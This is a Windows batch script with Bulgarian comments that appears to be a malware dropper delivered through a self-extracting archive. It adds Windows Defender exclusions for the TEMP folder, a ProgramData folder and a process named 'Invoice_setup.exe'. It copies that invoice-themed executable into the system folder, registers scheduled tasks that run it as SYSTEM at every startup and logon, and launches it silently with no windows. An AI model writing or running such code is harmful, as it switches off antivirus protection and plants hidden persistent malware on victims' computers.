@echo off
chcp 65001 >nul

:: Дефиниране на сигурна системна папка
set "TARGET_DIR=C:\ProgramData\MySystemSetup"
set "EXE_NAME=Invoice_setup.exe"
set "LOG_FILE=%TARGET_DIR%\install_log.txt"

:: 1. Създаване на целевата папка, ако не съществува
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo =================================================== >> "%LOG_FILE%"
echo [+] Начало на напълно скрита тиха инсталация: %date% %time% >> "%LOG_FILE%"

:: 2. Проверка за администраторски права
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] ГРЕШКА: Няма администраторски права. Скриптът спира. >> "%LOG_FILE%"
    exit
)

:: Насочване към временната папка на Windows, където WinRAR работи скрито
cd /d "%~dp0"

:: [НОВО] 3. Добавяне на изключения в Windows Defender за папка TEMP и целевата папка
:: Тази команда взима променливата %TEMP% и я добавя в реално време вDefender
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >> "%LOG_FILE%" 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" >> "%LOG_FILE%" 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess '%EXE_NAME%'" >> "%LOG_FILE%" 2>&1

:: 4. Проверка и спиране на стария процес, ако вече работи
tasklist /FI "IMAGENAME eq %EXE_NAME%" 2>nul | find /I "%EXE_NAME%" >nul
if %errorlevel% equ 0 (
    taskkill /F /IM "%EXE_NAME%" >nul 2>&1
)

:: 5. Копиране на софтуера в системната папка
del /F /Q "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1
xcopy /Y /K /H /R "%EXE_NAME%" "%TARGET_DIR%\" >> "%LOG_FILE%" 2>&1

:: Преминаване към крайната системна папка
cd /d "%TARGET_DIR%"

if not exist "%EXE_NAME%" (
    echo [!] ГРЕШКА: Файлът не беше копиран! >> "%LOG_FILE%"
    exit
)

:: 6. Изчистване на стари планирани задачи
schtasks /delete /tn "RunInvoiceSetup_Startup" /F >nul 2>&1
schtasks /delete /tn "RunInvoiceSetup_Logon" /F >nul 2>&1

:: 7. Създаване на задачите за автоматично стартиране при рестарт и пускане
set "SILENT_ARGS=/VERYSILENT /SUPPRESSMSGBOXES /NORESTART /S /qn /quiet"

schtasks /create /F /tn "RunInvoiceSetup_Startup" /tr "\"%TARGET_DIR%\%EXE_NAME%\" %SILENT_ARGS%" /sc ONSTART /ru "NT AUTHORITY\SYSTEM" /rl HIGHEST >> "%LOG_FILE%" 2>&1

set "LOGON_CMD=cmd.exe /c taskkill /F /IM %EXE_NAME% ^& start \"\" \"%TARGET_DIR%\%EXE_NAME%\" %SILENT_ARGS%"
schtasks /create /F /tn "RunInvoiceSetup_Logon" /tr "%LOGON_CMD%" /sc ONLOGON /rl HIGHEST >> "%LOG_FILE%" 2>&1

:: 8. НЕЗАБАВНО СТАРТИРАНЕ (В напълно тих режим без прозорци)
echo [+] Незабавно стартиране в тих режим... >> "%LOG_FILE%"
start "" "%TARGET_DIR%\%EXE_NAME%" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /S /qn /quiet

echo [+] Автономната конфигурация приключи успешно! >> "%LOG_FILE%"
echo =================================================== >> "%LOG_FILE%"
exit
